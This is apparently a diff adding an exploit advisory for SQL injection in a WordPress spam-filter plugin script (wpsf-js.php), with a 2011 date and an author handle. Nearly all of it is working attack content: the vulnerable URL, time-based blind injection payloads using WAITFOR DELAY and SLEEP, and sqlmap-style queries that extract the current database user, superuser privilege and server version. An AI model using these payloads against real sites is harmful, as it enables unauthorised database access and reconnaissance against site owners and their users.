@@ -1,0 +1,19 @@
+#Exploit Title:[ WordPress wpsf-js plugin, SQL Injection]
+#Date: 2011-09-25
+#Author: [cheki]
+#Version:[3.2.1]
+#Tested on:[linux]
+#Used: ["sqlmap"]
+#SQL Injection
+http://<target>/wp-content/plugins/wp-spamfree/js/wpsf-js.php?id=1
+
+#Exploit:id=-1; WAITFOR DELAY '0:0:5';-- or id=-1 AND SLEEP(5)
+
+#[http://<taget>:80/wp-content/plugins/wp-spamfree/js/wpsf-js.php][GET][id=-1][CURRENT_USER()
+
+#http://<target>:80/wp-content/plugins/wp-spamfree/js/wpsf-js.php][GET][id=-1][SELECT (CASE WHEN ((SELECT super_priv FROM
+mysql.user WHERE user='None' LIMIT 0,1)='Y') THEN 1 ELSE 0 END)
+
+#http://<target>:80/wp-content/plugins/wp-spamfree/js/wpsf-js.php][GET][id=-1][MID((VERSION()),1,6)
+
+#Home page: http://hacking.ge/
